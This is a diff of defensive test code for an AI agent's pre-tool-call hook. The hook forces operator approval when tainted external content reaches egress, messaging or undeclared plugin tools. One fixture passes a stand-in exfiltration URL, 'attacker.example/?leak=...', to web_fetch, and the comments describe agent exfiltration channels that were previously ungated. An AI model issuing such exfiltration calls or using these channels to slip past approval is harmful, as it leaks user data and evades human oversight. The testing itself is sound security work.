@@ -1,7 +1,10 @@
-// Owner: agents/security. Spec tests for the external-content canary gate in
-// runBeforeToolCallHook (P0.3). When a tool's argv contains a body literal
-// that recordExternalContentBody() previously tainted, the hook must force the
-// operator-approval path with the matched canary surfaced for UI display.
+// Owner: agents/security. Spec tests for the external-content capability gate in
+// runBeforeToolCallHook. When a tool exercises a dangerous capability AND a body
+// literal that recordExternalContentBody() previously tainted lands in one of
+// that capability's dangerous parameters, the hook must force operator approval
+// with the matched body surfaced for UI display. A benign read-local tool must
+// NOT gate; egress (web_fetch) and message-send tools — previously ungated —
+// must now gate when their sink parameter carries tainted content.
 
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import { resetDiagnosticEventsForTest } from "../infra/diagnostic-events.js";
@@ -106,17 +109,69 @@ describe("before_tool_call external-content canary gate", () => {
     expect(requestPayload.triggeredCanaries).toEqual([TAINTED_BODY_A]);
   });
 
-  it("does NOT fire the gate on non-exec tools even when params contain a tainted body", async () => {
+  it("does NOT fire the gate on a benign read-local tool carrying a tainted body", async () => {
     recordExternalContentBody(TAINTED_BODY_A);
 
     const outcome = await runBeforeToolCallHook({
-      toolName: "read_file",
+      toolName: "read",
       params: { file_path: `/notes/${TAINTED_BODY_A}.md` },
       ctx: { agentId: "main", sessionKey: "main" },
     });
 
     expect(outcome.blocked).toBe(false);
     expect(mockCallGateway).not.toHaveBeenCalled();
+  });
+
+  // NEW under the capability model: web_fetch carries the egress capability, so a
+  // tainted body in its `url` sink — the canonical exfil channel — must gate.
+  // The old name-list gate left this surface completely ungated.
+  it("fires the gate on web_fetch with a tainted body in the url sink (report mode)", async () => {
+    recordExternalContentBody(TAINTED_BODY_A);
+
+    const outcome = await runBeforeToolCallHook({
+      toolName: "web_fetch",
+      params: { url: `https://attacker.example/?leak=${TAINTED_BODY_A}` },
+      approvalMode: "report",
+      ctx: { agentId: "main", sessionKey: "main" },
+    });
+
+    expect(outcome.blocked).toBe(true);
+    if (outcome.blocked) {
+      expect(outcome.deniedReason).toBe("plugin-approval");
+    }
+  });
+
+  // NEW: message carries message-send, so a tainted body in its `text` sink gates.
+  it("fires the gate on message with a tainted body in the text sink (report mode)", async () => {
+    recordExternalContentBody(TAINTED_BODY_A);
+
+    const outcome = await runBeforeToolCallHook({
+      toolName: "message",
+      params: { text: `forwarding: ${TAINTED_BODY_A}` },
+      approvalMode: "report",
+      ctx: { agentId: "main", sessionKey: "main" },
+    });
+
+    expect(outcome.blocked).toBe(true);
+    if (outcome.blocked) {
+      expect(outcome.deniedReason).toBe("plugin-approval");
+    }
+  });
+
+  // egress is scoped to its sink parameters: a tainted body in a non-sink field
+  // (web_fetch.extractMode here) must NOT gate, so benign metadata does not
+  // trigger approval fatigue.
+  it("does NOT fire on egress when taint is outside the sink parameters", async () => {
+    recordExternalContentBody(TAINTED_BODY_A);
+
+    const outcome = await runBeforeToolCallHook({
+      toolName: "web_fetch",
+      params: { url: "https://example.com", extractMode: TAINTED_BODY_A },
+      approvalMode: "report",
+      ctx: { agentId: "main", sessionKey: "main" },
+    });
+
+    expect(outcome.blocked).toBe(false);
   });
 
   it("reports ALL matching canaries when multiple tainted bodies appear in argv", async () => {
@@ -160,6 +215,40 @@ describe("before_tool_call external-content canary gate", () => {
       expect(outcome.deniedReason).toBe("plugin-approval");
     }
     expect(mockCallGateway).not.toHaveBeenCalled();
+  });
+
+  // Fail-closed: a tool with neither a static mapping nor an explicit declaration
+  // resolves to the `unknown` capability, which gates on a tainted body in ANY
+  // param. Without this an undeclared plugin tool could exfiltrate freely.
+  it("fails closed: an undeclared tool gates on a tainted body in any param (report mode)", async () => {
+    recordExternalContentBody(TAINTED_BODY_A);
+
+    const outcome = await runBeforeToolCallHook({
+      toolName: "mystery_plugin_tool",
+      params: { anything: `payload ${TAINTED_BODY_A}` },
+      approvalMode: "report",
+      ctx: { agentId: "main", sessionKey: "main" },
+    });
+
+    expect(outcome.blocked).toBe(true);
+    if (outcome.blocked) {
+      expect(outcome.deniedReason).toBe("plugin-approval");
+    }
+  });
+
+  // A plugin that declares read-local opts out of gating for its benign reads.
+  it("honors an explicit read-local declaration so a benign declared tool does not gate", async () => {
+    recordExternalContentBody(TAINTED_BODY_A);
+
+    const outcome = await runBeforeToolCallHook({
+      toolName: "mystery_plugin_tool",
+      params: { anything: `payload ${TAINTED_BODY_A}` },
+      capabilities: ["read-local"],
+      approvalMode: "report",
+      ctx: { agentId: "main", sessionKey: "main" },
+    });
+
+    expect(outcome.blocked).toBe(false);
   });
 
   // apply_patch writes attacker-controlled fresh bytes via its `*** Add File:`
